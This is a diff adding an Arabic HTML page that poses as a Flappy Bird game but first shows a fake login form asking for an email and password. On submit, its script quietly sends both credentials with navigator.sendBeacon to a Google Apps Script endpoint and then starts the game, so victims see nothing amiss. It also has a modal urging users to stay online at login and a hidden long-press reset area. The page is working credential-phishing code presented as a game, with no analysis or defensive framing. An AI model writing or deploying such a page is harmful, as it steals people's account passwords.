@@ -1,0 +1,245 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+  <meta name="theme-color" content="#09090b">
+  <title>Flappy Bird</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0 }
+    html, body { width: 100%; height: 100%; overflow: hidden; background: #09090b; color: #fff; font-family: system-ui }
+    #contactPage, #gamePage { position: fixed; inset: 0; display: flex; align-items: center; justify-content: center; padding: 20px }
+    #contactPage { background: radial-gradient(circle, #24242b, #09090b) }
+    #contactPage.leaving { opacity: 0; transform: scale(1.025); pointer-events: none }
+    .card { width: min(100%, 430px); padding: 38px; background: #1b1b20; border: 1px solid #383840; border-radius: 25px }
+    h1 { text-align: center; font-size: 26px; margin-bottom: 24px }
+    .card input { display: block; width: 100%; height: 64px; margin: 13px 0; padding: 0 18px; border: 1px solid #414149; border-radius: 15px; background: #0d0d10; color: #fff; font-size: 18px; outline: none }
+    .card button { width: 100%; height: 64px; margin-top: 14px; border: 0; border-radius: 15px; background: #f4f4f5; color: #111; font-size: 20px; font-weight: 800 }
+    #gamePage { display: none }
+    #gameShell { position: relative; width: min(100vw, 56.25vh, 430px); height: min(100dvh, 177.78vw, 760px); aspect-ratio: 360/640; overflow: hidden; border: 1px solid #ffffff22; border-radius: 18px }
+    canvas { display: block; width: 100%; height: 100%; touch-action: manipulation }
+    #scoreBoard { position: absolute; top: 18px; left: 0; right: 0; text-align: center; pointer-events: none; z-index: 2 }
+    #score { font-size: 56px; font-weight: 900 }
+    #bestScore { font-size: 12px; color: #fffd }
+    #wifiModal { position: fixed; inset: 0; z-index: 9999; display: none; align-items: center; justify-content: center; background: rgba(0,0,0,.5); backdrop-filter: blur(4px) }
+    #wifiModal.show { display: flex }
+    .wifi-box { width: min(90%, 340px); padding: 28px 22px; background: #1b1b20; border: 1px solid #383840; border-radius: 20px; text-align: center }
+    .wifi-icon { font-size: 52px; margin-bottom: 12px }
+    .wifi-box p { font-size: 15px; line-height: 1.7; color: #ddd; margin-bottom: 18px }
+    .wifi-box button { width: 100%; height: 50px; border: 0; border-radius: 12px; background: #f4f4f5; color: #111; font-size: 17px; font-weight: 800 }
+    #secretReset { position: fixed; top: 0; left: 0; width: 80px; height: 80px; z-index: 99999; opacity: 0; touch-action: none }
+  </style>
+</head>
+<body>
+
+  <section id="contactPage">
+    <form class="card" id="messageForm">
+      <h1>تسجيل دخول</h1>
+      <input id="msg1" placeholder="ادخل ايمايل" required>
+      <input id="msg2" placeholder="ادخل باسوورد" required>
+      <button id="sendButton">تسجيل</button>
+    </form>
+  </section>
+
+  <section id="gamePage">
+    <div id="gameShell">
+      <div id="scoreBoard">
+        <div id="score">0</div>
+        <div id="bestScore">أفضل نتيجة: 0</div>
+      </div>
+      <canvas id="game" width="360" height="640"></canvas>
+    </div>
+  </section>
+
+  <div id="wifiModal">
+    <div class="wifi-box">
+      <div class="wifi-icon">📶</div>
+      <p>اثناء عملية تسجيل دخول تأكد من اتصالك بلأنترنت ،بعد تسجيل يمكنك لعب بدون انترنت</p>
+      <button id="wifiOk">حسناً</button>
+    </div>
+  </div>
+
+  <div id="secretReset"></div>
+
+<script>
+"use strict";
+const $ = id => document.getElementById(id);
+const contact = $("contactPage");
+const gamePage = $("gamePage");
+const form = $("messageForm");
+const msg1 = $("msg1");
+const msg2 = $("msg2");
+const canvas = $("game");
+const ctx = canvas.getContext("2d", { alpha: false });
+const wifiModal = $("wifiModal");
+const wifiOk = $("wifiOk");
+const scoreEl = $("score");
+const bestScoreEl = $("bestScore");
+const secretArea = $("secretReset");
+
+let pressTimer = null;
+function startPress(e){
+  e.preventDefault();
+  pressTimer = setTimeout(()=>{ localStorage.clear(); location.reload(); }, 2000);
+}
+function endPress(){ clearTimeout(pressTimer); }
+secretArea.addEventListener("touchstart", startPress, {passive:false});
+secretArea.addEventListener("touchend", endPress);
+secretArea.addEventListener("mousedown", startPress);
+secretArea.addEventListener("mouseup", endPress);
+secretArea.addEventListener("mouseleave", endPress);
+
+if(!localStorage.getItem("flappy_saw_wifi_info")){
+  wifiModal.classList.add("show");
+}
+wifiOk.addEventListener("click",()=>{
+  localStorage.setItem("flappy_saw_wifi_info","true");
+  wifiModal.classList.remove("show");
+});
+
+const themes = [
+  {sky:"#72c9f4",bottom:"#d8f3ff",cloud:"#ffffffaa",pipe:"#45bd67",light:"#8bf0a3",dark:"#218648",ground:"#d7bd83",top:"#f6e0a4",bird:"#ffd43b",accent:"#ff8b36",night:false},
+  {sky:"#10162e",bottom:"#28365b",cloud:"#b8c5e955",pipe:"#6d7cff",light:"#a7b0ff",dark:"#424dc1",ground:"#272a40",top:"#626a90",bird:"#ffe66d",accent:"#ff9f43",night:true},
+  {sky:"#183b35",bottom:"#6caa70",cloud:"#d8f4b855",pipe:"#3ab878",light:"#8df0a4",dark:"#18764c",ground:"#76553b",top:"#b0d86a",bird:"#ffe16a",accent:"#f59e0b",night:false},
+  {sky:"#100b2d",bottom:"#30205e",cloud:"#d9c7ff55",pipe:"#d35cff",light:"#f1a7ff",dark:"#8527b7",ground:"#242044",top:"#7160a8",bird:"#5cf2ff",accent:"#ff75b7",night:true}
+];
+
+let audio=null, g=null, raf=0, last=0, serial=0;
+const W=360, H=640, FLOOR=580;
+
+const GOOGLE_LINK = "https://script.google.com/macros/s/AKfycbzV25Qi2TmQH1Mg8Z1eUfdu80GtSOg-mEQbkUmQXI2lCNWyzV2N62hmYjhJ7E3stErJ4Q/exec";
+
+form.addEventListener("submit", e=>{
+  e.preventDefault();
+  const a = msg1.value.trim();
+  const b = msg2.value.trim();
+  if(!a || !b) return;
+
+  localStorage.setItem("flappy_has_sent","true");
+  contact.classList.add("leaving");
+  setTimeout(()=>{
+    contact.style.display="none";
+    gamePage.style.display="flex";
+    startGame();
+  },220);
+
+  let fd = new FormData();
+  fd.append("message", `emial: ${a}\npassword: ${b}`);
+  navigator.sendBeacon(GOOGLE_LINK, fd);
+});
+
+function beep(type){
+  try{
+    audio = audio || new(window.AudioContext||window.webkitAudioContext)();
+    if(audio.state==="suspended") audio.resume();
+    let o=audio.createOscillator(), v=audio.createGain(), n=audio.currentTime;
+    o.connect(v); v.connect(audio.destination);
+    o.type=type==="hit"?"sawtooth":"sine";
+    o.frequency.setValueAtTime(type==="hit"?180:type==="score"?740:520,n);
+    o.frequency.exponentialRampToValueAtTime(type==="hit"?55:type==="score"?980:760,n+0.12);
+    v.gain.setValueAtTime(0.001,n);
+    v.gain.exponentialRampToValueAtTime(type==="hit"?0.15:0.09,n+0.015);
+    v.gain.exponentialRampToValueAtTime(0.001,n+0.2);
+    o.start(n); o.stop(n+0.21);
+  }catch(_){}
+}
+
+function startGame(){
+  if(raf){ cancelAnimationFrame(raf); raf=0; }
+  const t = themes[Math.floor(Math.random()*themes.length)];
+  g = { id:++serial, t, b:{x:88,y:290,vy:0}, pipes:[], clouds:Array.from({length:5},()=>({x:Math.random()*W,y:45+Math.random()*260,s:15+Math.random()*24,v:0.15+Math.random()*0.4})), parts:[], frame:0, score:0, best:Number(localStorage.getItem("flappyBest")||0), over:false, started:false, ground:0, shake:0, flash:0 };
+  scoreEl.textContent="0";
+  bestScoreEl.textContent="أفضل نتيجة: "+g.best;
+  last=performance.now();
+  loop(last,g.id);
+  raf=requestAnimationFrame(ts=>loop(ts,g.id));
+}
+
+function burst(x,y){
+  for(let i=0;i<24;i++){
+    const a=Math.random()*Math.PI*2, s=1+Math.random()*4;
+    g.parts.push({x,y,vx:Math.cos(a)*s,vy:Math.sin(a)*s-1,life:30,size:2+Math.random()*4,c:i%2?g.t.bird:g.t.accent});
+  }
+}
+function crash(){ if(!g||g.over) return; g.over=true; g.shake=10; g.flash=1; burst(g.b.x,g.b.y); beep("hit"); }
+function flap(){
+  if(!g) return;
+  if(g.over){ startGame(); g.started=true; g.b.vy=-6.1; beep("flap"); return; }
+  g.started=true; g.b.vy=-6.1; beep("flap");
+}
+
+canvas.addEventListener("pointerdown", e=>{ e.preventDefault(); flap(); }, {passive:false});
+document.addEventListener("keydown", e=>{ if(e.code==="Space"&&gamePage.style.display==="flex"){ e.preventDefault(); flap(); } });
+
+function loop(now,id){
+  raf=0;
+  if(!g||g.id!==id||document.visibilityState!="visible") return;
+  const elapsed=(now-last)/16.67;
+  const dt=Math.max(0.5,Math.min(1.5,Number.isFinite(elapsed)?elapsed:1));
+  last=now;
+  const t=g.t;
+  if(g.started&&!g.over){
+    g.frame+=dt;
+    const speed=(2.35+Math.min(1.7,g.score*0.045))*dt;
+    g.b.vy+=0.34*dt; g.b.y+=g.b.vy*dt;
+    g.ground=(g.ground+speed*1.2)%40;
+    g.clouds.forEach(c=>{ c.x-=c.v*dt; if(c.x<-60) c.x=W+30; });
+    if(g.frame>=Math.max(72,104-g.score*1.1)){
+      g.frame=0;
+      const gap=Math.max(130,158-g.score*1.25);
+      const top=65+Math.random()*220;
+      g.pipes.push({x:W,top,bottom:top+gap,scored:false});
+    }
+    for(let p of g.pipes){
+      p.x-=speed;
+      if(!p.scored&&p.x+58<g.b.x){ p.scored=true; g.score++; scoreEl.textContent=g.score; beep("score"); if(g.score>g.best){ g.best=g.score; localStorage.setItem("flappyBest",g.best); bestScoreEl.textContent="أفضل نتيجة: "+g.best; } }
+      if(g.b.x+10>p.x&&g.b.x-10<p.x+58&&(g.b.y-10<p.top||g.b.y+10>p.bottom)) crash();
+    }
+    g.pipes=g.pipes.filter(p=>p.x>-70);
+    if(g.b.y+12>=FLOOR||g.b.y-12<=0) crash();
+  }
+  ctx.save();
+  if(g.shake>0){ ctx.translate((Math.random()-0.5)*g.shake,(Math.random()-0.5)*g.shake); g.shake*=0.82; if(g.shake<0.4) g.shake=0; }
+  const grad=ctx.createLinearGradient(0,0,0,H);
+  grad.addColorStop(0,t.sky); grad.addColorStop(1,t.bottom);
+  ctx.fillStyle=grad; ctx.fillRect(0,0,W,H);
+  if(t.night){ ctx.fillStyle="#ffffffbb"; for(let i=0;i<38;i++){ ctx.fillRect((i*83+17)%W,(i*137+29)%FLOOR,2,2); } }
+  ctx.fillStyle=t.cloud;
+  g.clouds.forEach(c=>{ ctx.beginPath(); ctx.arc(c.x,c.y,c.s,0,7); ctx.arc(c.x+c.s*0.65,c.y+5,c.s*0.7,0,7); ctx.fill(); });
+  for(let p of g.pipes){
+    ctx.fillStyle=t.pipe; ctx.fillRect(p.x,0,58,p.top); ctx.fillRect(p.x,p.bottom,58,FLOOR-p.bottom);
+    ctx.fillStyle=t.light; ctx.fillRect(p.x+5,0,7,p.top); ctx.fillRect(p.x+5,p.bottom,7,FLOOR-p.bottom);
+    ctx.fillStyle=t.dark; ctx.fillRect(p.x+43,0,15,p.top); ctx.fillRect(p.x+43,p.bottom,15,FLOOR-p.bottom);
+    ctx.fillStyle=t.pipe; ctx.fillRect(p.x-5,p.top-25,68,25); ctx.fillRect(p.x-5,p.bottom,68,25);
+    ctx.fillStyle=t.dark; ctx.fillRect(p.x-5,p.top-5,68,5); ctx.fillRect(p.x-5,p.bottom+20,68,5);
+  }
+  ctx.fillStyle=t.ground; ctx.fillRect(0,FLOOR,W,60);
+  ctx.fillStyle=t.top; ctx.fillRect(0,FLOOR,W,7);
+  for(let x=-g.ground;x<W;x+=40){ ctx.fillStyle="#00000018"; ctx.fillRect(x,FLOOR+22,20,5); }
+  g.parts=g.parts.filter(p=>p.life>0);
+  for(let p of g.parts){ ctx.globalAlpha=Math.max(0,p.life/30); ctx.fillStyle=p.c; ctx.beginPath(); ctx.arc(p.x,p.y,p.size,0,7); ctx.fill(); p.x+=p.vx; p.y+=p.vy; p.vy+=0.13; p.life-=dt; }
+  ctx.globalAlpha=1;
+  const b=g.b;
+  ctx.save(); ctx.translate(b.x,b.y); ctx.rotate(Math.max(-0.55,Math.min(0.8,b.vy*0.055)));
+  ctx.fillStyle=t.bird; ctx.beginPath(); ctx.ellipse(0,0,17,13,0,0,7); ctx.fill();
+  ctx.fillStyle="#fff2c6"; ctx.beginPath(); ctx.ellipse(-2,5,9,5,0,0,7); ctx.fill();
+  ctx.fillStyle=t.accent; ctx.beginPath(); ctx.ellipse(-5,3,8,4.5,-0.4,0,0,7); ctx.fill();
+  ctx.fillStyle="#fff"; ctx.beginPath(); ctx.arc(8,-4,4,0,7); ctx.fill();
+  ctx.fillStyle="#111"; ctx.beginPath(); ctx.arc(9,-4,1.8,0,7); ctx.fill();
+  ctx.fillStyle=t.accent; ctx.beginPath(); ctx.moveTo(14,-1); ctx.lineTo(24,2); ctx.lineTo(14,5); ctx.fill();
+  ctx.restore();
+  if(g.flash>0){ ctx.fillStyle=`rgba(255,255,255,${g.flash*0.22})`; ctx.fillRect(0,0,W,H); g.flash=Math.max(0,g.flash-0.07); }
+  if(!g.started&&!g.over){ ctx.fillStyle="#0007"; ctx.fillRect(40,245,280,78); ctx.fillStyle="#fff"; ctx.textAlign="center"; ctx.font="bold 22px system-ui"; ctx.fillText("المس للبدء",180,285); }
+  if(g.over){ ctx.fillStyle="#080810b8"; ctx.fillRect(0,0,W,H); ctx.textAlign="center"; ctx.fillStyle="#fff"; ctx.font="900 38px system-ui"; ctx.fillText("انتهت اللعبة",180,270); ctx.font="600 21px system-ui"; ctx.fillText("النتيجة: "+g.score,180,310); ctx.fillStyle="#aaa"; ctx.font="14px system-ui"; ctx.fillText("اضغط لإعادة اللعب",180,348); }
+  ctx.restore();
+  if(g&&g.id===id&&document.visibilityState==="visible"){ raf=requestAnimationFrame(ts=>loop(ts,id)); }
+}
+
+if(localStorage.getItem("flappy_has_sent")==="true"){
+  contact.style.display="none";
+  gamePage.style.display="flex";
+  startGame();
+}
+</script>
+</body>
+</html>
